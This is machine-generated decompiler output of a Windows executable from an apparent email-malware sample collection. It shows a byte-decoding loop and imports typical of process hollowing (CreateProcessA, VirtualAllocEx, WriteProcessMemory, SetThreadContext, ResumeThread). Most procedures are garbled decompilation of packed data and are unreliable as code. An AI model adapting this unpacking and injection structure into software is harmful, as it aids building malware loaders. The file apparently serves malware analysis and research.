/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0039/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x00401077
 *	Argument size: -8
 *	Local size: 8
 *	Save regs size: 0
 */

__entry_point__()
{



    esp = esp - 8;
    (save)1582;
    (save)0x401133;
    L00401078();
    esp = esp + 16;
    esp = esp - 8;
    (save) *L00404400;
    (save)0x402000;
    L00401133();
    esp = esp + 16;
    esp = esp - 8;
    (save)1582;
    (save)0x401133;
    L00401078();
    esp = esp + 16;
    if(__entry_point__ == -1) {
        esp = esp - 8;
        lstrcpyA(__entry_point__, 4214784);
    }
    return(0);
}

/*	Procedure: 0x00401078 - 0x00401132
 *	Argument size: 4
 *	Local size: 4
 *	Save regs size: 0
 */

L00401078(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffffc;



    for(Vfffffffc = 0; 1; *( & Vfffffffc) = *( & Vfffffffc) + 1) {
        eax = Vfffffffc;
        if(eax >= Ac) {
            break;
        }
        if(Vfffffffc > 1) {
            *(A8 + Vfffffffc) = 255 ^ *(A8 + Vfffffffc);
        }
        if(Vfffffffc > 1 && (Vfffffffc - 1 & 3) == 0) {
            eax = Vfffffffc + A8;
            *(A8 + Vfffffffc) = *eax + 7;
        }
        if(Vfffffffc > 3) {
            edx = Vfffffffc - 3;
            eax = edx;
            edx = edx >> 31;
            if(3 / 3 % 3 / 3 == 0) {
                eax = Vfffffffc + A8;
                *(A8 + Vfffffffc) = *eax - 60;
            }
        }
        if((Vfffffffc & 1) == 0) {
            edx = Vfffffffc;
            *(A8 + Vfffffffc) = *(Vfffffffc + A8) - dl;
        }
    }
}

/* DEST BLOCK NOT FOUND: 00401138 -> 004010f1 */
/* DEST BLOCK NOT FOUND: 0040113d -> 00401132 */
/* DEST BLOCK NOT FOUND: 00401156 -> 0040110d */
/*	Procedure: 0x00401133 - 0x00401160
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401133()
{



    (save)ebp;
    *eax = ebx;
    <= ? L00401147 : ;
    <= ? L004010f1 : ;
    (save)edi;
    if(edi = edi + 1) {
        goto L00401132;
    }
    dh = 135;
    asm("in al,dx");
    asm("Unknown opcode 0xda");
    asm("in al,dx");
    dh = dh + *(ecx + 21308927);
    *(edi + eax + 492764562) = *(edi + eax + 492764562) + ebp;
    asm("cmpsd");
    al = al + ah;
    ss = ecx;
    asm("jpe 0x40110d");
    dl = dl | bl;
    asm("les esp,[eax+eax*2+0x14]");
    asm("adc al,0xd5");
    asm("retf");
}

stack space not deallocated on return
/*	Procedure: 0x00401161 - 0x0040126B
 *	Argument size: 2843
 *	Local size: 0
 *	Save regs size: 0
 */

L00401161()
{



    asm("ror byte [ebx+0xc5e181cd],cl");
    asm("int3");
    (restore)es;
    *ecx = *ecx - bh;
    edx = edx + 1;
    asm("ffree st7");
    *(eax + -784401511) = *(eax + -784401511) + cl;
    *(edx + 872704256) = *(edx + 872704256) | al;
    asm("adc [ebp+0x7],bh");
    dh = 84;
    asm("in eax,dx");
    *(ebp + 1053536257) = *(ebp + 1053536257) + -1424627143;
    asm("les ebp,[eax+0xb17aa392]");
    asm("int3");
    *LB1836300 = al;
    edi = -10679245;
    asm("xchg eax,edi");
    asm("xchg eax,edx");
    if(eax < 123348752) {
        *(ecx + 1) = *(ecx + 1) - 389663628;
    }
    *edi = al;
    edi = edi + 1;
L004011ae:
    do {
    } while(*(ebp + 1094844611) = *(ebp + 1094844611) + al);
    edx = edx - 1;
    *eax & al;
    eax = eax + 1;
    *(ebx + eax * 2 + -12974210) :: 100;
L004011be:
    esi = esi + 1;
    asm("in al,dx");
    asm("cld");
    eax = eax ^ *esi;
    asm("in al,dx");
    (save)es;
    goto L004011d6;
    eax = *gs();
    if(*%cs:ebp-0x36] = *%cs:ebp-0x36] + ch) {
        goto L004011be;
    }
    asm("rcr byte [edi+0x6],0x5b");
L004011d6:
    asm("jpe 0x40124b");
    asm("int3");
    (restore)edx;
    *(edi + 1440403520) = *(edi + 1440403520) + bh;
    (restore)es;
    (save)ss;
    *(ecx + 268526405) = cs;
    (restore)es;
    ch = ch >> 1;
    return;
    *(edi + edx * 2 + 123) = *(edi + edx * 2 + 123) + al;
    asm("jpe 0x40120b");
    *esi = *esi | bh;
    asm("Unknown opcode 0xc4");
    *(eax + 120) = 919288082;
    eax = L00000730();
    *ecx & bh;
    asm("cmpsb");
    (fsave)tword [ebx];
    ah = ah + ch;
    asm("rcr dword [edi+0x3e],cl");
    ecx = ecx ^ *eax;
    asm("out 0x0,al");
    asm("in eax,dx");
    (save)cs;
    asm("loope 0x401220");
    asm("sbb al,bl");
    asm("xchg eax,esp");
    asm("sbb dl,cl");
    if(al = al + 152) {
        goto L004011ae;
    }
    asm("loop 0x401235");
    ah = ah + dl;
    dh = 128;
    ecx = ecx ^ *%ds:ecx];
    asm("into");
    (save)es;
    if(!( *(edi + -939919646) = *(edi + -939919646) + dh)) {
    }
    *(eax + 60) & -87294697;
    *LC50C81F5 = eax;
    asm("hlt");
    (restore)es;
    ecx = ecx - 1;
    *(edx - 32) :: ebp;
    asm("out dx,eax");
    *(eax + -63036525) = *(eax + -63036525) + dh;
    *(edx + 1543799296) = *(edx + 1543799296) | ch;
    asm("adc esp,[ebp+0x1550de07]");
    *(eax + 1657526273) = *(eax + 1657526273) ^ -753397191;
    asm("Unknown opcode 0xc4");
    asm("rcr al,1");
    asm("retf");
    asm("jpe 0x401244");
    asm("int3");
    asm("retf 0x2600");
}

/*	Procedure: 0x0040126C - 0x00401342
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040126C()
{



    eax = eax + 1 + 1;
    asm("rol ebp,cl");
    (restore)es;
    asm("xchg al,[edi+0x1cc45f9]");
    *edi = *edi + 84;
    asm("std");
    dl = dl ^ *(ebx + edi * 2);
    *(edx + ecx * 8 + 2037060398) = *(edx + ecx * 8 + 2037060398) + dh;
    bl = 0;
    asm("lodsd");
    (restore)es;
    asm("outsb");
    asm("scasd");
    asm("sbb al,[ebp-0x33]");
    ch = ch + *(eax + 7);
    (save)ecx;
    asm("fcomi st6");
    asm("sbb [esi],al");
    asm("xchg eax,ecx");
    if(!( *(ecx - 1) = *(ecx - 1) + esp)) {
        bl = 41;
        (save)es;
        asm("enter 0xd77a,0xce");
        es = *eax;
        eax = *esi();
        *(edi + 1002833543) = *(edi + 1002833543) >> 1;
L004012ae:
        if(!(ch = ch + *ebx)) {
            asm("xchg eax,ebp");
            asm("sti");
            (fsave)st2;
            asm("adc eax,ebx");
            asm("out dx,al");
            asm("adc ebp,0x25cb7803");
            (restore)ss;
            asm("xchg eax,esp");
            dh = dh + *(ecx - 61);
            asm("in al,dx");
            edx = edx + 1;
            *eax = *eax & edi;
            asm("out 0x62,al");
            asm("insd");
            *(edx + eax * 8) = *(edx + eax * 8) + ch;
            asm("%g ret");
            asm("arpl [ebx+0x45d2f739],ax");
            *edi = *esi;
            edi = edi + 4;
            esi = esi + 4;
            esp = esp + *eax;
            (restore)es;
            *esi = *esi | esi;
            asm("rcr byte [esi+0x7a54001d],cl");
            asm("out 0xff,eax");
            eax & -507518202;
            (save)es;
            *LB8CADDFF = eax;
            asm("jpe 0x40131f");
            *(edx - 60) = *(edx - 60) | eax;
            asm("out dx,eax");
            asm("pushf");
            (save)es;
        }
        asm("lds edi,[ecx]");
        asm("Unknown opcode 0xff");
        if(*edi = *edi + edx) {
            goto L0040133f;
        }
        (save)ss;
        asm("in al,dx");
        asm("enter 0xff2d,0x28");
        asm("adc dword [ecx+0xe70728ca],0x9eca22ff");
    }
    asm("adc ebx,ebx");
    if(eax = eax - -258903234) {
        goto L004012ae;
    }
    esp = esp - *edx;
    (restore)es;
    asm("fisubr word [edi+0x3591518]");
    (fsave)(frestore) + *edi;
    ecx = 0;
    eax = eax | *esi;
    *(edi + eax * 2 - 62) = *(edi + eax * 2 - 62) >> 1;
    *edi & bh;
    (save)esi;
    *(ebx + ebp * 4) = *(ebx + ebp * 4) + ebx;
    *esi = *esi + eax;
    asm("lds edi,[ebx+edx-0x42]");
    asm("xchg eax,ebx");
    *(ebp + 2)();
    asm("insb");
    108 = *%ds:0x3fa300ba] * ecx;
L0040133f:
}

/*	Procedure: 0x00401343 - 0x00401364
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401343()
{



    ecx = 725675527;
    asm("Unknown opcode 0xfe");
    (restore)ebp;
    *edx = *edx + dh;
    asm("adc ch,cl");
    *(eax + -541120994) = *(eax + -541120994) + ch;
    (save)es;
    (save)ds;
    ecx :: edi;
    ebp = ebp + 1;
    asm("sbb [edx+0xc2ec1d96],ecx");
    asm("rol dword [esi],cl");
    asm("xchg eax,esi");
    al = bl;
    asm("retf");
}

/* DEST BLOCK NOT FOUND: 00401479 -> b444afbc */
stack space not deallocated on return
/*	Procedure: 0x00401365 - 0x00401658
 *	Argument size: -17470
 *	Local size: 0
 *	Save regs size: 0
 */

L00401365()
{



    (restore)eax;
    asm("mul dword [edi+0xc8c4ccfa]");
    ebp = ebp + -9;
    if(*(ebp - 71) != dh) {
        asm("Unknown opcode 0xfe");
        edx = -125993087;
        -6 = *(esi + -1954761013) * edi;
        edi = edi + 1;
        edi = -12515769;
        *LFF410647 = eax;
        edi = edi + 4;
        asm("aas");
        if(!(al = al & 107)) {
            asm("cmpsb");
            asm("les esi,[ebx]");
            dh = 218;
            asm("jpe 0x40139f");
        }
        asm("rcr dword [esi+0x65966000],1");
        asm("Unknown opcode 0xc4");
        asm("loop 0x4013eb");
        (restore)ebp;
        *(edx + 106167094) = *(edx + 106167094) + dl;
        if(bh > 0) {
            goto L00401427;
        }
        asm("enter 0x8e77,0xcb");
        asm("xchg bh,[edx+ecx*4+0x7e]");
        ah = al;
    }
    *esi = *esi + 204;
    asm("cli");
    asm("xchg eax,edx");
    al :: 120;
    asm("Unknown opcode 0xff");
    eax :: *(ebx + 101300105);
    *edi = al;
    edi = edi + 1;
    asm("jpe 0x40139f");
    *esi = *esi >> 1;
    *(esi + -17644523) = *(esi + -17644523) ^ dl;
    cl = cl - *(edx - 37);
    *edx = *edx << 1;
    al = al & 81;
    *edi = *esi;
    edi = edi + 4;
    asm("Unknown opcode 0xc7");
    (restore)esp;
    (restore)es;
    eax = eax ^ 1439323117;
    if(!(esi = esi + 4)) {
        asm("cli");
        asm("int3");
        ebx = ebx + edx;
        *eax = *eax + ebp;
        asm("lahf");
        edx = edx - 1;
        asm("retf 0x7449");
        asm("xchg dh,[edx+0x4c]");
L004013ee:
        asm("les eax,[eax+0x7a]");
        edi = 4105515;
        *esi = *esi + 1;
        *%ds:0xb000fa0d] = eax;
        if(bl = bl | *ecx) {
            goto Lb444afbc;
        }
        <= ? L0040143a : ;
        asm("les ebp,[edi+edi]");
        (save)650849915;
        goto ( *edi);
        (save)es;
        L00008e64();
        edi = -1005133355;
        asm("adc eax,[esi]");
        eax = L0000c000();
L00401427:
        if(*eax = *eax & edi) {
            goto L004014a8;
        }
        return;
        (restore)es;
        (save)es;
        esi = esi + 1;
        asm("adc esi,edi");
        asm("pusha");
        *(esi + ebp - 126) = *(esi + ebp - 126) + esi;
    }
L00401434:
    asm("cld");
    if(al = al + 196) {
        goto L00401427;
    }
    asm("%d pop ss");
    asm("enter 0x2ff4,0x2a");
    asm("repne sub al,0xc3");
    asm("out dx,eax");
    (save)es;
    cl = 116;
    asm("o16 cmp dh,al");
    *(edi + eax + 2077475185) = *(edi + eax + 2077475185) + ch;
    asm("adc [ebx-0x1a],bh");
    asm("retf");
    (fsave)(frestore) / *(esi - 49);
    ebp = ebp + 1;
    asm("stc");
    asm("rcl esi,0x36");
    (save)cs;
    asm("retf 0xffd1");
    asm("xchg eax,ebx");
    asm("jpo 0x40149e");
    edx = 0;
    (restore)es;
    asm("Unknown opcode 0x8e");
    if(al = al | 243) {
        goto L004013ee;
    }
    return;
    <= ? L00401463 : ;
    >= ? 0x4014ab : ;
    goto Lb444afbc;
    asm("%e rep cli");
    al = 255;
    asm("scasd");
    asm("retf 0x74ad");
    (fsave)(frestore) / *(esi - 80);
    asm("les ebp,[eax+0xaa77e47b]");
    asm("retf");
    *L91F51FFC = al;
    if(al = al - *(edx + 1102839944)) {
        goto L00401434;
    }
    (save)ecx;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    ebx = ebx + *(eax + 1420930507);
    (save)es;
    asm("xchg eax,ecx");
    eax = eax + 1;
    asm("retf");
    asm("cli");
    asm("int3");
    asm("aas");
    (save)ss;
L004014a8:
    asm("enter 0xf29e,0xbe");
    *ecx = *ecx + 1174897866;
    *(esi + 1073774192)();
    *(ebp + -821686857) = *(ebp + -821686857) | -5;
    asm("out 0x45,al");
    goto L1d4748cc;
    dh :: ah;
    asm("retf 0x33");
    es = -671636153;
    al = *esi;
    esi = esi + 1;
    esp = esp | *(ebx + 7);
    dl = dl & *edi;
    esi = esi + 1;
    asm("Unknown opcode 0xc7");
    (restore)ecx;
    *(eax + -1824634558)();
    asm("xchg eax,ecx");
    asm("adc edx,[ecx+ebp*8]");
    asm("aas");
    eax = 1241978475;
    if(dl > 1241978475) {
        *(edi + 1345893207) = *(edi + 1345893207) + 1241978475;
        asm("xlatb");
        asm("jpe 0x401476");
        asm("cmc");
        (restore)ebp;
        al :: 7;
        asm("jpe 0x40150e");
        asm("das");
        eax :: 134113200;
    }
    dh = dh ^ *(ebx + 48);
    (save)ecx;
    eax = eax ^ 1103834115;
    eax = eax - 1076168425;
L0040150e:
    (restore)edi;
    asm("Unknown opcode 0xfe");
    asm("pusha");
    asm("aas");
    *edi = al;
    edi = edi + 1;
    asm("enter 0xcc32,0x5c");
    asm("sbb cl,[0xdd4a62c4]");
    *edx = *edx + dl;
    asm("o16 std");
    asm("rol dword [esi],cl");
    *(ebx + 352908257) = *(ebx + 352908257) + 1;
    ebp = ebp - 1;
    (restore)es;
    asm("sbb [ecx],edi");
    asm("std");
    (save)es;
    *(edi + esi - 66) = *(edi + esi - 66) >> 118;
L00401536:
    asm("adc ebp,[edi+0xf7074007]");
    (restore)es;
    dh = 23;
    if(ecx = ecx + eax) {
        goto L0040150e;
    }
    asm("in eax,dx");
    goto ( *(edx + eax * 2));
    asm("ffree st4");
    < ? L00401547 : ;
    *edi = al;
    edi = edi + 1;
    asm("loop 0x401510");
    (restore)es;
    (restore)edx;
    eax = *ebx();
    *(ecx + -725192709) = *(ecx + -725192709) ^ -1;
    asm("xchg eax,edi");
    if(!(al = al + 164)) {
        goto L00401536;
        (restore)es;
        asm("xchg eax,edx");
        asm("scasd");
        asm("popa");
        asm("retf 0xbde1");
        *esi = eax;
        asm("lds eax,[eax-0x1]");
L0040156f:
        asm("jpe 0x4015b3");
        *(esi + 961149952) = *(esi + 961149952) >> 1;
        asm("retf 0x7b8");
        if(bh = bh + ah) {
            goto L0040156f;
        }
        asm("das");
        asm("out dx,eax");
        al = 255;
        >= ? L0040150a : ;
        asm("lock inc ebx");
        dl = 7;
        asm("outsb");
        asm("sti");
        asm("cmpsb");
        asm("retf 0xf0a5");
        asm("fdivr dword [ebx]");
        al = *L75839FC3;
        asm("sti");
        eax = eax ^ esi;
        asm("cwde");
L0040159a:
        eax = *(ebx + 121)();
        asm("adc bl,ch");
        asm("xchg eax,esi");
        (restore)es;
        (save)esi;
        asm("scasd");
        al = al + *(ebp - 75);
L004015a6:
        dl = dl + *(eax + 7);
        ebx :: ebx;
        asm("xchg eax,esi");
    }
    if(!(eax = eax + 100728649)) {
        esi = 2093253766;
        *(eax + 1993047679) = *(eax + 1993047679) + -1;
        *(edx + 107987671) = *(edx + 107987671) - al;
        al = 66;
        goto L0040159a;
        (save)0;
        asm("daa");
        eax = eax + 2002043749;
        asm("wait");
        asm("Unknown opcode 0xfe");
        (restore)edi;
        asm("retf 0x7a97");
        asm("aaa");
        *(edx - 60) = *(edx - 60) | bl;
        *(eax - 108) = *(eax - 108) - al;
        (save)ss;
        (save)ebp;
        asm("retf");
        (save)edx;
        asm("pushf");
        ebp = ebp - 1;
        *(ebx - 59) = *(ebx - 59) & 971835212;
        return;
        *eax = *eax + cl;
        *L08533E7B = al;
        al = al + *eax;
        asm("salc");
        al = al + 180;
        asm("adc bh,ch");
        (restore)es;
        asm("%s push edi");
        asm("insd");
        *edi = *edi + 231419905;
        *(edx + 23) :: ebp;
        eax = eax - esp;
        *esi = *esi - al;
        asm("adc bx,[ebx]");
        (save)ds;
        if(eax >= 132454300) {
            goto L004015a6;
        }
        asm("adc dword [0xc5cb1803],0x11049a17");
        return;
        *(edx - 55) = es;
        < ? L00401647 : ;
        return;
    }
    asm("rep or [esi],eax");
    asm("les esi,[ebx+0x3374079]");
    asm("retf");
    asm("Unknown opcode 0xfe");
    asm("scasd");
    asm("xlatb");
    dh = dh + bh;
    return;
    *(ebx + 1160640501) & 129237257;
    asm("scasd");
    asm("std");
    asm("sbb ax,0xaf");
    Lbdba35dc();
    dl = dl | ah;
    asm("les edi,[edi+0xdd141c40]");
    asm("retf");
}

/*	Procedure: 0x00401659 - 0x00401665
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401659()
{



    (fsave)(frestore) / *(ecx + -974552619);
    asm("aam 0x7");
    eax = eax + 1;
    *(edx - 35) :: ecx;
    asm("iret");
}

/*	Procedure: 0x00401666 - 0x004016B8
 *	Argument size: 31459
 *	Local size: 0
 *	Save regs size: 0
 */

L00401666()
{



    *(eax + -650247238) = *(eax + -650247238) + dl;
    *(edx + -716717312) = *(edx + -716717312) | cl;
    edx = esi % esi;
    asm("adc ebp,0x2d07bcc5");
    if(!(esi = esi / esi)) {
        bh = bh + *(ecx + -910788608);
        *(esi + -411275002) = *(esi + -411275002) | ebp;
        return;
        *eax = *eax | -90;
        asm("les esp,[eax+0x40]");
        asm("loopne 0x4016a9");
        eax = *L99909ECB;
        *(edi + -335046459) = *(edi + -335046459) - -1814098375;
        *(ebx + esi * 4 - 57) = *(ebx + esi * 4 - 57) + dl;
        asm("%d lahf");
        *esi = *esi | cl;
        (restore)ss;
    }
    asm("adc cl,[ecx+0x7]");
    asm("Unknown opcode 0x82");
    (restore)esi;
    ecx = 2080461697;
    asm("retf");
}

stack space not deallocated on return
/*	Procedure: 0x004016B9 - 0x0040178F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004016B9()
{



    (save)ss;
    *(esi + 1959032599) :: esi;
    (save)es;
    dl = 19;
    -2 = *L0000007C * esp;
    asm("das");
    (save)es;
    asm("fdivr qword [esi]");
    asm("Unknown opcode 0x8f");
    *edx = *edx | ebp;
    *ebx = *ebx + dl;
    (restore)esi;
    if(eax < 119871452) {
        asm("xchg eax,edx");
        asm("sbb al,0xff");
        (save)edi;
        edi = edi + 1;
        asm("xchg eax,ecx");
        asm("sti");
        es = *(ecx + 122735313);
        es = *(edx - 53);
        asm("ror dword [edx+0x0],1");
        edx = edx | *(edx + -2038021420);
        eax = eax + 1;
        asm("Unknown opcode 0xc6");
        al :: 255;
        *(edi + -1632437036) = *(edi + -1632437036) + 1;
        asm("std");
        *(esi + eax * 4) = *(esi + eax * 4) + dh;
        edi = 0;
        asm("rep add dword [ecx-0x45],-0x62");
        *LD5CB2803 = *LD5CB2803 ^ 631136882;
        asm("les esp,[eax]");
        dh = 119;
        (save) *(ecx + -603999798);
        (save)es;
        eax = eax | -711191719;
        asm("xchg eax,ebp");
        asm("Unknown opcode 0x0f");
        eax :: 131282824;
        ecx = ecx ^ -1312095230;
        (restore)ss;
        asm("retf 0xfd06");
        return;
        if(dh = dh | *(ebx + 122)) {
            goto L0040177b;
        }
        ch = 71;
        asm("xchg eax,esi");
        (save) *(esi + 181);
        asm("rcl dword [esi+0xff71f5bc],cl");
        asm("wait");
        asm("bound esi,[esi+0xfd066bee]");
    }
    asm("popf");
    goto L00005ac2;
    asm("adc edx,[ebx+0xa6dbd99c]");
    (save)es;
    asm("cdq");
    *edx = *edx - 1;
    (restore)es;
    (save)ebp;
    ebp = esp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    esp = esp - 4;
    *(ebp - 4) = *(ebp + 8);
L00401772:
    *(ebp + 16) = *(ebp + 16) - 1;
L0040177b:
    if(*(ebp + 16) != -1) {
        edx = *(ebp + 8);
        eax = *(ebp + 12);
        *edx = al;
        *(ebp + 8) = *(ebp + 8) + 1;
        goto L00401772;
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

/* DEST BLOCK NOT FOUND: 00401790 -> 00401772 */
/*	Procedure: 0x00401790 - 0x0040179F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ExitProcess()
{



    goto ( *__imp__ExitProcess);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017a0 -> 00401772 */
/*	Procedure: 0x004017A0 - 0x004017AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetShortPathNameA()
{



    goto ( *__imp__GetShortPathNameA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017b0 -> 00401772 */
/*	Procedure: 0x004017B0 - 0x004017BF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetModuleFileNameA()
{



    goto ( *__imp__GetModuleFileNameA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017c0 -> 00401772 */
/*	Procedure: 0x004017C0 - 0x004017CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CloseHandle()
{



    goto ( *__imp__CloseHandle);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017d0 -> 00401772 */
/*	Procedure: 0x004017D0 - 0x004017DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ResumeThread()
{



    goto ( *__imp__ResumeThread);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017e0 -> 00401772 */
/*	Procedure: 0x004017E0 - 0x004017EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

SetThreadContext()
{



    goto ( *__imp__SetThreadContext);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 004017f0 -> 00401772 */
/*	Procedure: 0x004017F0 - 0x004017FF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

WriteProcessMemory()
{



    goto ( *__imp__WriteProcessMemory);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401800 -> 00401772 */
/*	Procedure: 0x00401800 - 0x0040180F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

VirtualAllocEx()
{



    goto ( *__imp__VirtualAllocEx);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401810 -> 00401772 */
/*	Procedure: 0x00401810 - 0x0040181F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

ReadProcessMemory()
{



    goto ( *__imp__ReadProcessMemory);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401820 -> 00401772 */
/*	Procedure: 0x00401820 - 0x0040182F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetThreadContext()
{



    goto ( *__imp__GetThreadContext);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401830 -> 00401772 */
/*	Procedure: 0x00401830 - 0x0040183F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CreateProcessA()
{



    goto ( *__imp__CreateProcessA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401840 -> 00401772 */
/*	Procedure: 0x00401840 - 0x0040184F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

lstrcatA()
{



    goto ( *__imp__lstrcatA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401850 -> 00401772 */
/*	Procedure: 0x00401850 - 0x0040185F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetEnvironmentVariableA()
{



    goto ( *__imp__GetEnvironmentVariableA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00401860 -> 00401772 */
/*	Procedure: 0x00401860 - 0x0040187B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

lstrcpyA()
{



    goto ( *__imp__lstrcpyA);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    *eax = *eax + 1;
    *eax = *eax + al;
    bh = bh + bh;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__entry_point__;
/* 0x00401790       0 */ /* unknown */ void 	ExitProcess;
/* 0x004017a0       0 */ /* unknown */ void 	GetShortPathNameA;
/* 0x004017b0       0 */ /* unknown */ void 	GetModuleFileNameA;
/* 0x004017c0       0 */ /* unknown */ void 	CloseHandle;
/* 0x004017d0       0 */ /* unknown */ void 	ResumeThread;
/* 0x004017e0       0 */ /* unknown */ void 	SetThreadContext;
/* 0x004017f0       0 */ /* unknown */ void 	WriteProcessMemory;
/* 0x00401800       0 */ /* unknown */ void 	VirtualAllocEx;
/* 0x00401810       0 */ /* unknown */ void 	ReadProcessMemory;
/* 0x00401820       0 */ /* unknown */ void 	GetThreadContext;
/* 0x00401830       0 */ /* unknown */ void 	CreateProcessA;
/* 0x00401840       0 */ /* unknown */ void 	lstrcatA;
/* 0x00401850       0 */ /* unknown */ void 	GetEnvironmentVariableA;
/* 0x00401860       0 */ /* unknown */ void 	lstrcpyA;
/* 0x0040606c       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00406070       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x00406074       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00406078       0 */ /* unknown */ void 	__imp__GetEnvironmentVariableA;
/* 0x0040607c       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x00406080       0 */ /* unknown */ void 	__imp__GetShortPathNameA;
/* 0x00406084       0 */ /* unknown */ void 	__imp__GetThreadContext;
/* 0x00406088       0 */ /* unknown */ void 	__imp__ReadProcessMemory;
/* 0x0040608c       0 */ /* unknown */ void 	__imp__ResumeThread;
/* 0x00406090       0 */ /* unknown */ void 	__imp__SetThreadContext;
/* 0x00406094       0 */ /* unknown */ void 	__imp__VirtualAllocEx;
/* 0x00406098       0 */ /* unknown */ void 	__imp__WriteProcessMemory;
/* 0x0040609c       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x004060a0       0 */ /* unknown */ void 	__imp__lstrcpyA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
